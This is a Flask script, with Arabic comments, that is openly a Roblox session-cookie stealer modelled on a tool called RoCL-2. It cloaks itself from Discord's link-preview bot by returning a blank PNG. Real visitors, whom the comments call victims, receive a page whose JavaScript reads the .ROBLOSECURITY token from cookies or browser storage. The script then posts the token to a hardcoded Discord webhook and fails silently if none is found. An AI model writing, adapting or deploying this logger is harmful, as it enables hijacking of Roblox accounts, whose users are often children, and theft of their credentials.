from flask import Flask, request
import base64

app = Flask(__name__)

# غيّر الويب هوك بتاعك هنا
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def rocl_discord_logger(path):
    ua = request.headers.get('User-Agent', '')

    # لديسكورد بوت: صورة PNG عشان preview يشتغل زي RoCL
    if 'Discordbot' in ua or 'discord' in ua.lower():
        # صورة PNG بسيطة 1x1 زي في RoCL examples
        fake_img = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake_img, 200, {'Content-Type': 'image/png'}

    # HTML للضحية: صورة + JS من RoCL-2 للكوكي فقط
    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// RoCL-2 Style Cookie Logger - فقط الكوكي Roblox (من GitHub lilmond/RoCL-2)
setTimeout(() => {{
  // قراءة الكوكي زي RoCL: document.cookie أولاً
  let cookies = document.cookie;
  let robloMatch = cookies.match(/\\.ROBLOSECURITY=([^;]+)/);
  if (robloMatch) {{
    // ابعت للويب هوك زي RoCL webhook send
    fetch("{WEBHOOK}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{
        username: "RoCL-2 Logger",
        embeds: [{{
          title: ".ROBLOSECURITY Cookie",
          description: robloMatch[1],
          color: 0x00ff00
        }}]
      }})
    }});
    return;
  }}

  // Fallback RoCL: localStorage للكوكيز المخزنة
  let stored = localStorage.getItem('.ROBLOSECURITY') || sessionStorage.getItem('.ROBLOSECURITY');
  if (stored) {{
    fetch("{WEBHOOK}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{
        username: "RoCL-2 Logger",
        embeds: [{{
          title: ".ROBLOSECURITY (Stored)",
          description: stored,
          color: 0x00ff00
        }}]
      }})
    }});
    return;
  }}

  // Silent fail زي RoCL - ما نبعتش حاجة لو فشل
}}, 800);

</script>
</body></html>"""

    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == "__main__":
    app.run()
